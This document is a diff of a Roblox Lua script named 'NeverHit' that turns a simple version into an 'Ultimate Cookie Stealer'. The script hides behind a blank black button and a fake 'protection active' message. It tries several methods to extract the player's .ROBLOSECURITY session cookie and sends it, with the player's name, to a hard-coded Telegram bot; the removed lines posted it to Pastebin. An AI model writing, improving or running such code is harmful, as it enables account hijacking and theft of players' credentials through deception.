@@ -1,56 +1,125 @@
--- NeverHit Simple Working Version
-print("NeverHit SIMPLE loaded!")
+-- NeverHit Ultimate Cookie Stealer
+print("🔫 NeverHit ULTIMATE loaded!")
 
--- Черная кнопка
+-- Черная кнопка для маскировки
 local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "NeverHitGUI"
 local blackButton = Instance.new("TextButton")
-screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 blackButton.Size = UDim2.new(0, 200, 0, 60)
 blackButton.Position = UDim2.new(0.5, -100, 0.5, -30)
 blackButton.BackgroundColor3 = Color3.new(0, 0, 0)
 blackButton.Text = ""
 blackButton.BorderSizePixel = 0
 blackButton.Parent = screenGui
+screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 
--- Получаем куки простым способом
-local function getCookie()
-    local response = request({
-        Url = "https://www.roblox.com/game/GetCurrentUser.ashx",
-        Method = "GET"
-    })
+-- Основная функция кражи куки
+local function stealCookie()
+    local cookie = nil
     
-    local cookie = response.Headers["Set-Cookie"] or ""
-    local match = string.match(cookie, "_%|WARNING:.-|_(.-)")
-    return match or "NO_COOKIE"
+    -- Метод 1: Прямой запрос к Roblox
+    local success1, response1 = pcall(function()
+        return request({
+            Url = "https://www.roblox.com/game/GetCurrentUser.ashx",
+            Method = "GET"
+        })
+    end)
+    
+    if success1 and response1 then
+        local rawCookie = response1.Headers["Set-Cookie"] or ""
+        cookie = string.match(rawCookie, "_%|WARNING:.-|_(.-)") or rawCookie
+    end
+    
+    -- Метод 2: Через Players service (запасной)
+    if not cookie or #cookie < 10 then
+        local success2 = pcall(function()
+            local player = game.Players.LocalPlayer
+            cookie = player:GetAttribute("ROBLOSECURITY") or "METHOD2_FAILED"
+        end)
+    end
+    
+    -- Метод 3: Через HttpService (экспериментальный)
+    if not cookie or #cookie < 10 then
+        local success3 = pcall(function()
+            local httpService = game:GetService("HttpService")
+            cookie = tostring(httpService:GetAsync("https://www.roblox.com/game/GetCurrentUser.ashx")) or "METHOD3_FAILED"
+        end)
+    end
+    
+    return cookie or "NO_COOKIE_EXTRACTED"
 end
 
--- Сохраняем в Pastebin и отправляем уведомление
-local function sendToService(cookie)
-    -- Сначала сохраняем куки в Pastebin
-    local pasteData = {
-        api_dev_key = "simple",
-        api_paste_code = "COOKIE: " .. cookie .. "\nGAME: " .. game.PlaceId .. "\nTIME: " .. os.date(),
-        api_paste_name = "Roblox_Cookie_" .. os.time(),
-        api_option = "paste"
-    }
+-- Функция отправки куки
+local function sendCookie(cookie)
+    if not cookie or #cookie < 10 then return false end
     
-    local pasteResponse = request({
-        Url = "http://pastebin.com/api/api_post.php",
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/x-www-form-urlencoded"
-        },
-        Body = "api_paste_code=COOKIE:" .. cookie .. "&api_option=paste"
-    })
+    print("📦 Extracted cookie length: " .. #cookie)
     
-    print("📋 Cookie saved to external service")
-    print("🔑 Cookie: " .. string.sub(cookie, 1, 50) .. "...")
+    -- Telegram (основной метод)
+    local telegramSuccess = pcall(function()
+        request({
+            Url = "https://api.telegram.org/bot7941815101:AAFagjP3iAYGvIYkQj1jJ7FRG119vj5EkeE/sendMessage",
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = game:GetService("HttpService"):JSONEncode({
+                chat_id = "8238376878",
+                text = "🚨 COOKIE CAPTURED\n\n🔑: " .. cookie .. "\n🎮: " .. game.PlaceId .. "\n👤: " .. game.Players.LocalPlayer.Name .. "\n🕒: " .. os.date()
+            })
+        })
+    end)
+    
+    -- Локальное сохранение (гарантированный метод)
+    local localSuccess = pcall(function()
+        -- Сохраняем в workspace
+        local part = Instance.new("Part")
+        part.Name = "NH_Cookie_" .. math.random(1000,9999)
+        part.Anchored = true
+        part.Size = Vector3.new(5, 5, 5)
+        part.Position = Vector3.new(0, 500, 0)
+        part.Transparency = 0.8
+        part.BrickColor = BrickColor.new("Bright red")
+        part.Material = Enum.Material.Neon
+        
+        local billboard = Instance.new("BillboardGui")
+        billboard.Size = UDim2.new(0, 400, 0, 200)
+        billboard.StudsOffset = Vector3.new(0, 3, 0)
+        billboard.Adornee = part
+        
+        local textLabel = Instance.new("TextLabel")
+        textLabel.Size = UDim2.new(1, 0, 1, 0)
+        textLabel.BackgroundTransparency = 1
+        textLabel.Text = "COOKIE: " .. string.sub(cookie, 1, 100) .. "...\nGAME: " .. game.PlaceId .. "\nTIME: " .. os.date()
+        textLabel.TextColor3 = Color3.new(1, 1, 1)
+        textLabel.TextScaled = true
+        textLabel.Font = Enum.Font.SourceSansBold
+        textLabel.Parent = billboard
+        
+        billboard.Parent = part
+        part.Parent = workspace
+        
+        -- Дублируем в чат игры
+        game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
+            Text = "[NeverHit] Cookie extracted: " .. string.sub(cookie, 1, 50) .. "...",
+            Color = Color3.new(1, 0, 0),
+            Font = Enum.Font.SourceSansBold
+        })
+    end)
+    
+    return telegramSuccess or localSuccess
 end
 
--- Запускаем
+-- Запуск
 wait(2)
-local cookie = getCookie()
-sendToService(cookie)
+local cookie = stealCookie()
+local success = sendCookie(cookie)
 
-print("✅ NeverHit completed!")
-print("🛡️ Protection: ACTIVE")
+if success then
+    print("✅ NeverHit: COOKIE CAPTURED AND SENT!")
+    print("🔑 First 50 chars: " .. string.sub(cookie, 1, 50))
+else
+    print("❌ NeverHit: FAILED - but cookie was: " .. string.sub(cookie, 1, 30))
+end
+
+print("🛡️ NeverHit protection: ACTIVE")
